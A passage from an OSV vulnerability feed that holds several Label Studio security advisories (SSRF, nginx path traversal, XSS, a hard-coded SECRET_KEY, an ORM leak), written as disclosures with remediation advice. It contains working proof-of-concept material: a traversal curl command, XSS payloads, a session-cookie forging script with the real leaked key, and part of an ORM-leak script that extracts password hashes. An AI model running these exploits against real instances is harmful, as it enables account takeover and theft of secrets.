`7f000001.030d1fd6.rbndr.us` will randomly switch between the IP address `3.13.31.214` that is not blocked to `127.0.0.1` which is not allowed.\n\n# Impact\n\nSSRF vulnerabilities pose a significant risk on cloud environments, since instance credentials are managed by internal web APIs. An attacker can bypass Label Studio's SSRF protections to access internal web servers and partially compromise the confidentiality of those internal servers.\n\n# Remediation Advice\n\n* Before saving any responses, validate the destination IP address is not in the deny list.\n* Consider blocking internal cloud API IP ranges to mitigate the risk of compromising cloud credentials.\n\n# Discovered\n- August 2023, Alex Brown, elttam","fixed_in":["1.11.0"],"id":"GHSA-p59w-9gqw-wj8r","link":"https://osv.dev/vulnerability/GHSA-p59w-9gqw-wj8r","source":"osv","summary":null,"withdrawn":null},{"aliases":[],"details":"### Summary\nThe vulnerability resides on the Nginx config file:\nhttps://github.com/heartexlabs/label-studio/blob/53944e6bcede75ca5c102d655013f2e5238e85e6/deploy/default.conf#L119\n\nThe pattern on location /static indicates a popular misconfiguration on Nginx servers presented in 2018 originally by Orange Tsai. This vulnerability allows an attacker to use a single path traversal payload in the matched location to traverse one directory above. This vulnerability only happens due to the location /static directive not having a slash `/` at the end, the following code shows an example of a safe configuration:\n```nginx\nlocation /static/ {\n[...]\n```\nThe vulnerability works because Nginx will think that `/static../` is a directory that should also be aliased to the folder, allowing /static/../ to be reached. In Label Studio's case, this means all files on /label_studio/core/ are exposed.\n\nOf course, this means that only Label Studio instances that were deployed using the default nginx files introducted at Mar 31, 2021.\nThis is a very easy vulnerability to fix, and just a lesser-known configuration mistake on nginx files. It's very easy to happen because all is needed is for one slash to be missing. (Off-By-One)\n\n** Proof-of-Concept (Leaking Secret Keys): **\nExploiting this vulnerability usually depends on what's on the parent folder, in Label Studio's case the most interesting file I could find that's on there by default is /label_studio/core/ . We can fetch it by simply making a request to the traversed folder.\n```bash\n# Production Label Studio docker-compose running on localhost:8080\n/t/mydata [127]$ curl localhost:8080/static../settings/label_studio.py\n\"\"\"This file and its contents are licensed under the Apache License 2.0. Please see the included NOTICE for copyright information and LICENSE for a copy of the license.\n\"\"\"\nimport os\nimport pathlib\n\nfrom core.settings.base import *\n\nDJANGO_DB = get_env('DJANGO_DB', DJANGO_DB_SQLITE)\nDATABASES = {'default': DATABASES_ALL[DJANGO_DB]}\n\nMIDDLEWARE.append('organizations.middleware.DummyGetSessionMiddleware')\nMIDDLEWARE.append('core.middleware.UpdateLastActivityMiddleware')\nif INACTIVITY_SESSION_TIMEOUT_ENABLED:\n    MIDDLEWARE.append('core.middleware.InactivitySessionTimeoutMiddleWare')\n\nADD_DEFAULT_ML_BACKENDS = False\n\nLOGGING['root']['level'] = get_env('LOG_LEVEL', 'WARNING')\n\nDEBUG = get_bool_env('DEBUG', False)\n\nDEBUG_PROPAGATE_EXCEPTIONS = get_bool_env('DEBUG_PROPAGATE_EXCEPTIONS', False)\n\nSESSION_COOKIE_SECURE = False\n\nSESSION_ENGINE = \"django.contrib.sessions.backends.signed_cookies\"\n\nRQ_QUEUES = {}\n\nSENTRY_DSN = get_env(\n    'SENTRY_DSN',\n    'https://68b045ab408a4d32a910d339be8591a4@o227124.ingest.sentry.io/5820521'\n)\nSENTRY_ENVIRONMENT = get_env('SENTRY_ENVIRONMENT', 'opensource')\n\nFRONTEND_SENTRY_DSN = get_env(\n    'FRONTEND_SENTRY_DSN',\n    'https://5f51920ff82a4675a495870244869c6b@o227124.ingest.sentry.io/5838868')\nFRONTEND_SENTRY_ENVIRONMENT = get_env('FRONTEND_SENTRY_ENVIRONMENT', 'opensource')\n\nEDITOR_KEYMAP = json.dumps(get_env(\"EDITOR_KEYMAP\"))\n\nfrom label_studio import __version__\nfrom label_studio.core.utils import sentry\nsentry.init_sentry(release_name='label-studio', release_version=__version__)\n\n# we should do it after sentry init\nfrom label_studio.core.utils.common import collect_versions\nversions = collect_versions()\n\n# in Label Studio Community version, feature flags are always ON\nFEATURE_FLAGS_DEFAULT_VALUE = True\n# or if file is not set, default is using offline mode\nFEATURE_FLAGS_OFFLINE = get_bool_env('FEATURE_FLAGS_OFFLINE', True)\n\nfrom core.utils.io import find_file\nFEATURE_FLAGS_FILE = get_env('FEATURE_FLAGS_FILE', 'feature_flags.json')\nFEATURE_FLAGS_FROM_FILE = True\ntry:\n    from core.utils.io import find_node\n    find_node('label_studio', FEATURE_FLAGS_FILE, 'file')\nexcept IOError:\n    FEATURE_FLAGS_FROM_FILE = False\n\nSTORAGE_PERSISTENCE = get_bool_env('STORAGE_PERSISTENCE', True)\n```\n\n\n### Impact\nThe impact consists on leaking Django secret keys by default, with also greater risk being possible due to the vulnerability exposing the file located at /label_studio/core/settings/label_studio.py which contains the secret key for Django as well as possibly containing other secrets the user might put there. (If the administrator decides not to use environment variables for some variables)\n","fixed_in":["1.7.2"],"id":"GHSA-cpmr-mw4j-99r7","link":"https://osv.dev/vulnerability/GHSA-cpmr-mw4j-99r7","source":"osv","summary":null,"withdrawn":null},{"aliases":["CVE-2023-47115"],"details":"# Introduction\n\nThis write-up describes a vulnerability found in [Label Studio](https://github.com/HumanSignal/label-studio), a popular open source data labeling tool. The vulnerability affects all versions of Label Studio prior to `1.9.2` and was tested on version `1.8.2`.\n\n# Overview\n\n[Label Studio](https://github.com/HumanSignal/label-studio) has a cross-site scripting (XSS) vulnerability that could be exploited when an authenticated user uploads a crafted image file for their avatar that gets rendered as a HTML file on the website.\n\n# Description\n\nThe following [code snippet in Label Studio](https://github.com/HumanSignal/label-studio/blob/1.8.2/label_studio/users/functions.py#L18-L49) shows that the only verification check is that the file is an image by extracting the dimensions from the file.\n\n```python\n\ndef hash_upload(instance, filename):\n    filename = str(uuid.uuid4())[0:8] + '-' + filename\n    return settings.AVATAR_PATH + '/' + filename <3>\n\n\ndef check_avatar(files):\n    images = list(files.items())\n    if not images:\n        return None\n\n    filename, avatar = list(files.items())[0]  # get first file\n    w, h = get_image_dimensions(avatar) <1>\n    if not w or not h:\n        raise forms.ValidationError(\"Can't read image, try another one\")\n\n    # validate dimensions\n    max_width = max_height = 1200\n    if w > max_width or h > max_height:\n        raise forms.ValidationError('Please use an image that is %s x %s pixels or smaller.'\n                                    % (max_width, max_height))\n\n    # validate content type\n    main, sub = avatar.content_type.split('/') <2>\n    if not (main == 'image' and sub.lower() in ['jpeg', 'jpg', 'gif', 'png']):\n        raise forms.ValidationError(u'Please use a JPEG, GIF or PNG image.')\n\n    # validate file size\n    max_size = 1024 * 1024\n    if len(avatar) > max_size:\n        raise forms.ValidationError('Avatar file size may not exceed ' + str(max_size/1024) + ' kb')\n\n    return avatar\n```\n1. Attempts to get image dimensions to validate the uploaded avatar file is an image.\n2. Extracts the `Content-Type` from the upload `POST` request. A user can easily bypass this verification by changing the mimetype of the uploaded file to an allowed type (eg. `image/jpeg`).\n3. The file extension of the uploaded file is never validated and is saved to the filesystem.\n\n[Label Studio serves avatar images using Django's built-in `serve` view](https://github.com/HumanSignal/label-studio/blob/1.8.2/label_studio/users/urls.py#L25-L26), which is [not secure for production use according to Django's documentation](https://docs.djangoproject.com/en/4.2/ref/views/#serving-files-in-development).\n\n```python\n    re_path(r'^data/' + settings.AVATAR_PATH + '/(?P<path>.*)$', serve,\n            kwargs={'document_root': join(settings.MEDIA_ROOT, settings.AVATAR_PATH)}),\n```\n\nThe issue with the Django `serve` view is that it determines the `Content-Type` of the response by the file extension in the URL path. Therefore, an attacker can upload an image that contains malicious HTML code and name the file with a `.html` extension to be rendered as a HTML page. The only file extension validation is performed on the client-side, which can be easily bypassed.\n\n# Proof of Concept\n\nBelow are the steps to reproduce this issue and execute JavaScript code in the context of the Label Studio website.\n\n1. Using any JPEG or PNG image, add in the comment field in the metadata the HTML code `<script>alert(document.domain)</script>`. This can be done using the `exiftool` command as shown below that was used to create the following image.\n\n```bash\nexiftool -Comment='<script>alert(document.domain)</script>' penguin.jpg\n```\n\n![xss-penguin](https://user-images.githubusercontent.com/139727151/266989884-c2cd9b4f-f374-416e-a468-acf41f52e088.jpg)\n\n2. On Label Studio, navigate to account & settings page and intercept the upload request of the avatar image using a tool such as Burp Suite. Modify the filename in the request to have a `.html` extension.\n\n3. Right click the image on the avatar profile and copy the URL. Send this to a victim and it will display an alert box with the host name of the Label Studio instance as shown below.\n\n![xss-alert](https://user-images.githubusercontent.com/139727151/266989952-6fb74c6e-9961-447c-a602-5a6f36627ae6.png)\n\n# Impact\n\nExecuting arbitrary JavaScript could result in an attacker performing malicious actions on Label Studio users if they visit the crafted avatar image. For an example, an attacker can craft a JavaScript payload that adds a new Django Super Administrator user if a Django administrator visits the image.\n\n# Remediation Advice\n\n* Validate the file extension on the server side, not in client-side code.\n* Remove the use of Django's `serve` view and implement a secure controller for viewing uploaded avatar images.\n* Consider saving file content in the database rather than on the filesystem to mitigate against other file related vulnerabilities.\n* Avoid trusting user controlled inputs.\n\n# Discovered\n- August 2023, Alex Brown, elttam","fixed_in":["1.9.2"],"id":"GHSA-q68h-xwq5-mm7x","link":"https://osv.dev/vulnerability/GHSA-q68h-xwq5-mm7x","source":"osv","summary":null,"withdrawn":null},{"aliases":["CVE-2024-23633"],"details":"# Introduction\n\nThis write-up describes a vulnerability found in [Label Studio](https://github.com/HumanSignal/label-studio), a popular open source data labeling tool. The vulnerability affects all versions of Label Studio prior to `1.10.1` and was tested on version `1.9.2.post0`.\n\n# Overview\n\n[Label Studio](https://github.com/HumanSignal/label-studio) had a remote import feature allowed users to import data from a remote web source, that was downloaded and could be viewed on the website. This feature could had been abused to download a HTML file that executed malicious JavaScript code in the context of the Label Studio website.\n\n# Description\n\nThe following [code snippet in Label Studio](https://github.com/HumanSignal/label-studio/blob/1.9.2.post0/label_studio/data_import/uploader.py#L125C5-L146) showed that is a URL passed the SSRF verification checks, the contents of the file would be downloaded using the filename in the URL.\n\n```python\ndef tasks_from_url(file_upload_ids, project, user, url, could_be_tasks_list):\n    \"\"\"Download file using URL and read tasks from it\"\"\"\n    # process URL with tasks\n    try:\n        filename = url.rsplit('/', 1)[-1] <1>\n\n        response = ssrf_safe_get(\n            url, verify=project.organization.should_verify_ssl_certs(), stream=True, headers={'Accept-Encoding': None}\n        )\n        file_content = response.content\n        check_tasks_max_file_size(int(response.headers['content-length']))\n        file_upload = create_file_upload(user, project, SimpleUploadedFile(filename, file_content))\n        if file_upload.format_could_be_tasks_list:\n            could_be_tasks_list = True\n        file_upload_ids.append(file_upload.id)\n        tasks, found_formats, data_keys = FileUpload.load_tasks_from_uploaded_files(project, file_upload_ids)\n\n    except ValidationError as e:\n        raise e\n    except Exception as e:\n        raise ValidationError(str(e))\n    return data_keys, found_formats, tasks, file_upload_ids, could_be_tasks_list\n```\n1. The file name that was set was retrieved from the URL.\n\nThe downloaded file path could then be retrieved by sending a request to `/api/projects/{project_id}/file-uploads?ids=[{download_id}]` where `{project_id}` was the ID of the project and `{download_id}` was the ID of the downloaded file. Once the downloaded file path was retrieved by the previous API endpoint, the [following code snippet](https://github.com/HumanSignal/label-studio/blob/1.9.2.post0/label_studio/data_import/api.py#L595C1-L616C62) demonstrated that the `Content-Type` of the response was determined by the file extension, since `mimetypes.guess_type` guesses the `Content-Type` based on the file extension.\n\n```python\nclass UploadedFileResponse(generics.RetrieveAPIView):\n    permission_classes = (IsAuthenticated,)\n\n    @swagger_auto_schema(auto_schema=None)\n    def get(self, *args, **kwargs):\n        request = self.request\n        filename = kwargs['filename']\n        # XXX needed, on windows os.path.join generates '\\' which breaks FileUpload\n        file = settings.UPLOAD_DIR + ('/' if not settings.UPLOAD_DIR.endswith('/') else '') + filename\n        logger.debug(f'Fetch uploaded file by user {request.user} => {file}')\n        file_upload = FileUpload.objects.filter(file=file).last()\n\n        if not file_upload.has_permission(request.user):\n            return Response(status=status.HTTP_403_FORBIDDEN)\n\n        file = file_upload.file\n        if file.storage.exists(file.name):\n            content_type, encoding = mimetypes.guess_type(str(file.name)) <1>\n            content_type = content_type or 'application/octet-stream'\n            return RangedFileResponse(request, file.open(mode='rb'), content_type=content_type)\n        else:\n            return Response(status=status.HTTP_404_NOT_FOUND)\n```\n1. Determines the `Content-Type` based on the extension of the uploaded file by using `mimetypes.guess_type`.\n\nSince the `Content-Type` was determined by the file extension of the downloaded file, an attacker could import in a `.html` file that would execute JavaScript when visited.\n\n# Proof of Concept\n\nBelow were the steps to recreate this issue:\n\n1. Host the following HTML proof of concept (POC) script on an external website with the file extension `.html` that would be downloaded to the Label Studio website.\n\n```html\n<html>\n    <body>\n        <h1>Data Import XSS</h1>\n        <script>\n            alert(document.domain);\n        </script>\n    </body>\n</html>\n```\n\n2. Send the following `POST` request to download the HTML POC to the Label Studio and note the returned ID of the downloaded file in the response. In the following POC the `{victim_host}` is the address and port of the victim Label Studio website (eg. `labelstudio.com:8080`), `{project_id}` is the ID of the project where the data would be imported into, `{cookies}` are session cookies and `{evil_site}` is the website hosting the malicious HTML file (named `xss.html` in the following example).\n\n```http\nPOST /api/projects/{project_id}/import?commit_to_project=false HTTP/1.1\nHost: {victim_host}\nAccept: */*\nAccept-Language: en-US,en;q=0.5\nAccept-Encoding: gzip, deflate\ncontent-type: application/x-www-form-urlencoded\nContent-Length: 43\nConnection: close\nCookie: {cookies}\nPragma: no-cache\nCache-Control: no-cache\n\nurl=https://{evil_site}/xss.html\n```\n\n3. To retrieve the downloaded file path could be retrieved by sending a `GET` request to `/api/projects/{project_id}/file-uploads?ids=[{download_id}]`, where `{download_id}` is the ID of the file download from the previous step.\n\n4. Send your victim a link to `/data/{file_path}`, where `{file_path}` is the path of the downloaded file from the previous step. The following screenshot demonstrated executing the POC JavaScript code by visiting `/data/upload/1/cfcfc340-xss.html`.\n\n![xss-import-alert](https://user-images.githubusercontent.com/139727151/282223222-d8f9132c-838e-4aa6-9c03-a2bc83b4a409.png)\n\n# Impact\n\nExecuting arbitrary JavaScript could result in an attacker performing malicious actions on Label Studio users if they visit the crafted avatar image. For an example, an attacker can craft a JavaScript payload that adds a new Django Super Administrator user if a Django administrator visits the image.\n\n# Remediation Advice\n\n* For all user provided files that are downloaded by Label Studio, set the `Content-Security-Policy: sandbox;` response header when viewed on the site. The `sandbox` directive restricts a page's actions to prevent popups, execution of plugins and scripts and enforces a `same-origin` policy ([documentation](https://developer.mozilla.org/en-US/docs/Web/HTTP/Headers/Content-Security-Policy/sandbox)).\n* Restrict the allowed file extensions that could be downloaded.\n\n# Discovered\n- August 2023, Alex Brown, elttam","fixed_in":["1.10.1"],"id":"GHSA-fq23-g58m-799r","link":"https://osv.dev/vulnerability/GHSA-fq23-g58m-799r","source":"osv","summary":null,"withdrawn":null},{"aliases":["CVE-2023-43791"],"details":"# Introduction\n\nThis write-up describes a vulnerability found in [Label Studio](https://github.com/HumanSignal/label-studio), a popular open source data labeling tool. The vulnerability was found to affect versions before `1.8.2`, where a patch was introduced.\n\n# Overview\n\nIn [Label Studio version 1.8.1](https://github.com/HumanSignal/label-studio/tree/1.8.1), a hard coded Django `SECRET_KEY` was set in the application settings. The Django `SECRET_KEY` is used for signing session tokens by the web application framework, and should never be shared with unauthorised parties.\n\nHowever, the Django framework inserts a `_auth_user_hash` claim in the session token that is a HMAC hash of the account's password hash. That claim would normally prevent forging a valid Django session token without knowing the password hash of the account. However, any authenticated user can exploit an Object Relational Mapper (ORM) Leak vulnerability in Label Studio to leak the password hash of any account on the platform, which is reported as a separate vulnerability. An attacker can exploit the ORM Leak vulnerability (which was patched in [`1.9.2post0`](https://github.com/HumanSignal/label-studio/releases/tag/1.9.2.post0)) and forge session tokens for all users on Label Studio using the hard coded `SECRET_KEY`.\n\n# Description\n\nBelow is the code snippet of the Django settings file at [`label_studio/core/settings/base.py`](https://github.com/HumanSignal/label-studio/blob/1.8.1/label_studio/core/settings/base.py#L108).\n\n```python\n# SECURITY WARNING: keep the secret key used in production secret!\nSECRET_KEY = '$(fefwefwef13;LFK{P!)@#*!)kdsjfWF2l+i5e3t(8a1n'\n```\n\nThis secret is hard coded across all instances of Label Studio.\n\n# Proof of Concept\n\nBelow are the steps that an attacker could do to forge a session token of any account on Label Studio:\n\n1. Exploit the ORM Leak vulnerability (patched in [`1.9.2post0`](https://github.com/HumanSignal/label-studio/releases/tag/1.9.2.post0)) in Label Studio to retrieve the full password hash that will be impersonated. For this example, a session token will be forged for an account with the email `ghostccamm@testvm.local` with the password hash `pbkdf2_sha256$260000$KKeew1othBwMKk2QudmEgb$ALiopdBpWMwMDD628xeE1Ie7YSsKxdXdvWfo/PvVXvw=` that was retrieved.\n\n2. Create a new Django project with an empty application. In `cookieforge/cookieforge/settings.py` set the `SECRET_KEY` to `$(fefwefwef13;LFK{P!)@#*!)kdsjfWF2l+i5e3t(8a1n`. Create a management command with the following code that will be used to create forged session tokens.\n\n```python\nfrom typing import Any\nfrom django.core.management.base import  BaseCommand, CommandParser\nfrom django.core import signing\nfrom django.utils.crypto import salted_hmac\nfrom django.conf import settings\nimport time, uuid\n\nclass Command(BaseCommand):\n    help = \"Forge a users session cookie on Label Studio\"\n\n    def add_arguments(self, parser: CommandParser) -> None:\n        parser.add_argument(\n            '-o', '--organisation',\n            help='Organisation ID to access',\n            default=1,\n            type=int\n        )\n\n        parser.add_argument(\n            'user_id',\n            help='The User ID of the victim you want to impersonate',\n            type=str\n        )\n\n        parser.add_argument(\n            'user_hash',\n            help='The password hash the user you want to impersonate'\n        )\n\n    def handle(self, *args: Any, **options: Any) -> str | None:\n        key = settings.SECRET_KEY\n        # Creates the _auth_user_hash HMAC of the victim's password hash\n        auth_user_hash = salted_hmac(\n            'django.contrib.auth.models.AbstractBaseUser.get_session_auth_hash',\n            options['user_hash'],\n            secret=key,\n            algorithm=\"sha256\"\n        ).hexdigest()\n\n        session_dict = {\n            'uid': str(uuid.uuid4()), \n            'organization_pk': options['organisation'], \n            'next_page': '/projects/', \n            'last_login': time.time(), \n            '_auth_user_id': options['user_id'], \n            '_auth_user_backend': \n            'django.contrib.auth.backends.ModelBackend', \n            '_auth_user_hash': auth_user_hash, \n            'keep_me_logged_in': True, \n            '_session_expiry': 600\n        }\n\n        # Creates a forged session token\n        session_token = signing.dumps(\n            session_dict,\n            key=key,\n            salt=\"django.contrib.sessions.backends.signed_cookies\",\n            compress=True\n        )\n\n        self.stdout.write(\n            self.style.SUCCESS(f\"session token: {session_token}\")\n        )\n```\n\n3. Next run the following command replacing the `{user_id}` with the user ID of the account you want to the impersonate and `{user_hash}` with the victim's password hash. Copy the session token that is printed.\n\n```python\npython3 manage.py forgecookie {user_id} '{user_hash}'\n```\n\n4. Change the `sessionid` cookie on the browser and refresh the page. Observe being authenticated as the victim user.\n\n# Impact\n\nThis vulnerability can be chained with the ORM Leak vulnerability (which was patched in [`1.9.2post0`](https://github.com/HumanSignal/label-studio/releases/tag/1.9.2.post0)) in Label Studio to impersonate any account on Label Studio. An attacker could exploit these vulnerabilities to escalate their privileges from a low privilege user to a Django Super Administrator user.\n\n# Remediation Advice\n\nIt is important to note that the hard coded `SECRET_KEY` has already been removed in Label Studio versions `>=1.8.2`. However, there has not been any public disclosure about the use of the hard coded secret key and users have not been informed about the security vulnerability.\n\nWe recommend that Human Signal to release a public disclosure about the hard coded `SECRET_KEY` to encourage users to patch to a version `>=1.8.2` to mitigate the likelihood of an attacker exploiting these vulnerabilities to impersonate all accounts on the platform.\n\n# Discovered\n- August 2023, Robert Schuh, @robbilie\n- August 2023, Alex Brown, elttam","fixed_in":["1.8.2"],"id":"GHSA-f475-x83m-rx5m","link":"https://osv.dev/vulnerability/GHSA-f475-x83m-rx5m","source":"osv","summary":null,"withdrawn":null},{"aliases":["CVE-2023-47117"],"details":"# Introduction\n\nThis write-up describes a vulnerability found in [Label Studio](https://github.com/HumanSignal/label-studio), a popular open source data labeling tool. The vulnerability affects all versions of Label Studio prior to `1.9.2post0` and was tested on version `1.8.2`.\n\n# Overview\n\nIn all current versions of [Label Studio](https://github.com/HumanSignal/label-studio), the application allows users to insecurely set filters for filtering tasks. An attacker can construct a *filter chain* to filter tasks based on sensitive fields for all user accounts on the platform by exploiting Django's Object Relational Mapper (ORM). Since the results of query can be manipulated by the ORM filter, an attacker can leak these sensitive fields character by character. For an example, the following filter chain will task results by the password hash of an account on Label Studio.\n\n```\nfilter:tasks:updated_by__active_organization__active_users__password\n```\n\nFor consistency, this type of vulnerability will be termed as **ORM Leak** in the rest of this disclosure. \n\nIn addition, Label Studio had a hard coded secret key that an attacker can use to forge a session token of any user by exploiting this ORM Leak vulnerability to leak account password hashes.\n\n# Description\n\nThe following code snippet from the `ViewSetSerializer` in [`label_studio/data_manager/serializers.py`](https://github.com/HumanSignal/label-studio/blob/1.8.2/label_studio/data_manager/serializers.py#L115) insecurely creates `Filter` objects from a JSON `POST` request to the `/api/dm/views/{viewId}` API endpoint.\n\n```python\n    @staticmethod\n    def _create_filters(filter_group, filters_data):\n        filter_index = 0\n        for filter_data in filters_data:\n            filter_data[\"index\"] = filter_index\n            filter_group.filters.add(Filter.objects.create(**filter_data))\n            filter_index += 1\n```\n\nThese `Filter` objects are then applied in the `TaskQuerySet` in [`label_studio/data_manager/managers.py`](https://github.com/HumanSignal/label-studio/blob/1.8.2/label_studio/data_manager/managers.py#L473).\n\n```python\nclass TaskQuerySet(models.QuerySet):\n    def prepared(self, prepare_params=None):\n        \"\"\" Apply filters, ordering and selected items to queryset\n\n        :param prepare_params: prepare params with project, filters, orderings, etc\n        :return: ordered and filtered queryset\n        \"\"\"\n        from projects.models import Project\n\n        queryset = self\n\n        if prepare_params is None:\n            return queryset\n\n        project = Project.objects.get(pk=prepare_params.project)\n        request = prepare_params.request\n        queryset = apply_filters(queryset, prepare_params.filters, project, request) <1>\n        queryset = apply_ordering(queryset, prepare_params.ordering, project, request, view_data=prepare_params.data)\n\n        if not prepare_params.selectedItems:\n            return queryset\n\n        # included selected items\n        if prepare_params.selectedItems.all is False and prepare_params.selectedItems.included:\n            queryset = queryset.filter(id__in=prepare_params.selectedItems.included)\n\n        # excluded selected items\n        elif prepare_params.selectedItems.all is True and prepare_params.selectedItems.excluded:\n            queryset = queryset.exclude(id__in=prepare_params.selectedItems.excluded)\n\n        return queryset\n```\n1. User provided filters are insecurely applied here by calling the `apply_filters` that constructs the Django ORM filter.\n\nThe `PreparedTaskManager` in [`label_studio/data_manager/managers.py`](https://github.com/HumanSignal/label-studio/blob/1.8.2/label_studio/data_manager/managers.py#L655) uses the vulnerable `TaskQuerySet` for building the Django queryset for querying `Task` objects, as shown in the following code snippet.\n\n```python\nclass PreparedTaskManager(models.Manager):\n    #...\n\n    def get_queryset(self, fields_for_evaluation=None, prepare_params=None, all_fields=False): <1>\n        \"\"\"\n        :param fields_for_evaluation: list of annotated fields in task\n        :param prepare_params: filters, ordering, selected items\n        :param all_fields: evaluate all fields for task\n        :param request: request for user extraction\n        :return: task queryset with annotated fields\n        \"\"\"\n        queryset = self.only_filtered(prepare_params=prepare_params)\n        return self.annotate_queryset(\n            queryset,\n            fields_for_evaluation=fields_for_evaluation,\n            all_fields=all_fields,\n            request=prepare_params.request\n        )\n\n    def only_filtered(self, prepare_params=None):\n        request = prepare_params.request\n        queryset = TaskQuerySet(self.model).filter(project=prepare_params.project) <1>\n        fields_for_filter_ordering = get_fields_for_filter_ordering(prepare_params)\n        queryset = self.annotate_queryset(queryset, fields_for_evaluation=fields_for_filter_ordering, request=request)\n        return queryset.prepared(prepare_params=prepare_params)\n```\n1. Special Django method for the `models.Manager` class that is used to retrieve the queryset for querying objects of a model.\n2. Uses the vulnerable `TaskQuerySet` that was explained above.\n\nThe following code snippet of the `Task` model in [`label_studio/tasks/models.py`](https://github.com/HumanSignal/label-studio/blob/1.8.2/label_studio/tasks/models.py#L49C1-L102C102) shows that the vulnerable `PreparedTaskManager` is set as a class variable, along with the `updated_by` relational mapping to a Django user that will be exploited as the entrypoint of the filter chain.\n\n```python\n# ...\nclass Task(TaskMixin, models.Model):\n    \"\"\" Business tasks from project\n    \"\"\"\n    id = models.AutoField(auto_created=True, primary_key=True, serialize=False, verbose_name='ID', db_index=True)\n\n    # ...\n\n    updated_by = models.ForeignKey(settings.AUTH_USER_MODEL, related_name='updated_tasks',\n        on_delete=models.SET_NULL, null=True, verbose_name=_('updated by'),\n        help_text='Last annotator or reviewer who updated this task') <1>\n\n    # ...\n\n    objects = TaskManager()  # task manager by default\n    prepared = PreparedTaskManager()  # task manager with filters, ordering, etc for data_manager app <2>\n\n    # ...\n```\n1. The entry point of the filter chain to filter by the `updated_by__active_organization__active_users__password`.\n2. The vulnerable `PreparedTaskManager` being set that will be exploited.\n\nFinally, the `TaskListAPI` view set in [`label_studio/tasks/api.py`](https://github.com/HumanSignal/label-studio/blob/1.8.2/label_studio/tasks/api.py#L205) with the `/api/tasks` API endpoint uses the vulnerable `PreparedTaskManager` to filter `Task` objects.\n\n```python\n    def get_queryset(self):\n        task_id = self.request.parser_context['kwargs'].get('pk')\n        task = generics.get_object_or_404(Task, pk=task_id)\n        review = bool_from_request(self.request.GET, 'review', False)\n        selected = {\"all\": False, \"included\": [self.kwargs.get(\"pk\")]}\n        if review:\n            kwargs = {\n                'fields_for_evaluation': ['annotators', 'reviewed']\n            }\n        else:\n            kwargs = {'all_fields': True}\n        project = self.request.query_params.get('project') or self.request.data.get('project')\n        if not project:\n            project = task.project.id\n        return self.prefetch(\n            Task.prepared.get_queryset(\n                prepare_params=PrepareParams(project=project, selectedItems=selected, request=self.request),\n                **kwargs\n            )) <1>\n```\n1. Uses the vulnerable `PreparedTaskManager` to filter objects.\n\n# Proof of Concept\n\nBelow are the steps to exploit about how to exploit this vulnerability to leak the password hash of an account on Label Studio.\n\n1. Create two accounts on Label Studio and choose one account to be the victim and the other the hacker account that you will use.\n2. Create a new project or use an existing project, then add a task to the project. Update the task with the hacker account to cause the entry point of the filter chain.\n3. Navigate to the task view for the project and add any filter with the `Network` inspect tab open on the browser. Look for a `PATCH` request to `/api/dm/views/{view_id}?interaction=filter&project={project_id}` and save the `view_id` and `project_id` for the next step.\n4. Download the attached proof of concept exploit script named `labelstudio_ormleak.py`. This script will leak the password hash of the victim account character by character. Run the following command to run the exploit script, replacing the `{view_id}`, `{project_id}`, `{cookie_str}` and `{url}` with the corresponding values. For further explanation run `python3 labelstudio_ormleak.py --help`.\n\n```bash\npython3 labelstudio_ormleak.py -v {view_id} -p {project_id} -c '{cookie_str}' -u '{url}'\n```\n\nThe following example GIF demonstrates exploiting this ORM Leak vulnerability to retrieve the password hash `pbkdf2_sha256$260000$KKeew1othBwMKk2QudmEgb$ALiopdBpWMwMDD628xeE1Ie7YSsKxdXdvWfo/PvVXvw=`.\n\n![labelstudio_ormleak_poc](https://user-images.githubusercontent.com/139727151/266986646-a3d1367c-fb4d-4482-9b6a-18a5d7316385.gif)\n\n# Impact\n\nThis vulnerability can be exploited to completely compromise the confidentiality of highly sensitive account information, such as account password hashes. For all versions `<=1.8.1`, this finding can also be chained with hard coded `SECRET_KEY` to forge session tokens of any user on Label Studio and could be abuse to deteriorate the integrity and availability.\n\n# Remediation Advice\n\n* Do not use unsanitised values for constructing a filter for querying objects using Django's ORM. Django's ORM allows querying by relation field and performs auto lookups, that enable filtering by sensitive fields.\n* Validate filter values to an allow list before performing any queries.\n\n# Discovered\n- August 2023, Alex Brown, elttam\n\n---\n# `labelstudio_ormleak.py` proof of concept\n\n```py\nimport argparse\nimport re\nimport requests\nimport string\nimport sys\n\n# Password hash characters\nCHARS = string.ascii_letters + string.digits + '$/+=_!'\nCHARS_LEN = len(CHARS)\n\nPAYLOAD = {\n    \"data\": {\n        \"columnsDisplayType\": {},\n        \"columnsWidth\": {},\n        \"filters\": {\n            \"conjunction\": \"and\",\n            \"items\": [\n                {\n                    \"filter\": \"filter:tasks:updated_by__active_organization__active_users__password\", # ORM Leak filter chain\n                    \"operator\": \"regex\", # Use regex operator to filter password hash value\n                    \"type\": \"String\",\n                    \"value\": \"REPLACEME\"\n                }\n            ]\n        },\n        \"gridWidth\": 4,\n        \"hiddenColumns\":{\"explore\":[\"tasks:inner_id\"],\"labeling\":[\"tasks:id\",\"tasks:inner_id\"]},\n        \"ordering\": [],\n        \"search_text\": None,\n        \"target\": \"tasks\",\n        \"title\": \"Default\",\n        \"type\": \"list\"\n    },\n    \"id\": 1, # View ID\n    \"project\": \"1\" # Project ID\n}\n\ndef parse_args() -> argparse.Namespace:\n    parser = argparse.ArgumentParser(\n        description='Leak an accounts password hash by exploiting a ORM Leak vulnerability in Label Studio'\n    )\n\n    parser.add_argument(\n        '-v', '--view-id',\n        help='View id of the page',\n        type=int,\n        required=True\n    )\n\n    parser.add_argument(\n        '-p', '--project-id',\n        help='Project id to filter tasks for',\n        type=int,\n        required=True\n    )\n\n    parser.add_argument(\n        '-c', '--cookie-str',\n        help='Cookie string for authentication',\n        required=True\n    )\n\n    parser.add_argument(\n        '-u', '--url',\n        help='Base URL to Label Studio instance',\n        required=True\n    )\n\n    return parser.parse_args()\n\ndef setup() -> dict:\n    args = parse_args()\n    view_id = args.view_id\n    project_id = args.project_id\n    path_1 = \"/api/dm/views/{view_id}?interaction=filter&project={project_id}\".format(\n        view_id=view_id,\n        project_id=project_id\n    )\n    path_2 = \"/api/tasks?page=1&page_size=1&view={view_id}&interaction=filter&project={project_id}\".format(\n        view_id=view_id,\n        project_id=project_id\n    )\n    PAYLOAD[\"id\"] = view_id\n    PAYLOAD[\"project\"] = str(project_id)\n    \n    config_dict = {\n        'COOKIE_STR': args.cookie_str,\n        'URL_PATH_1': args.url + path_1,\n        'URL_PATH_2': args.url + path_2,\n        'PAYLOAD': PAYLOAD\n    }\n    return config_dict\n\ndef test_payload(config_dict: dict, payload) -> bool:\n    sys.stdout.flush()\n    cookie_str = config_dict[\"COOKIE_STR\"]\n    r_set = requests.patch(\n        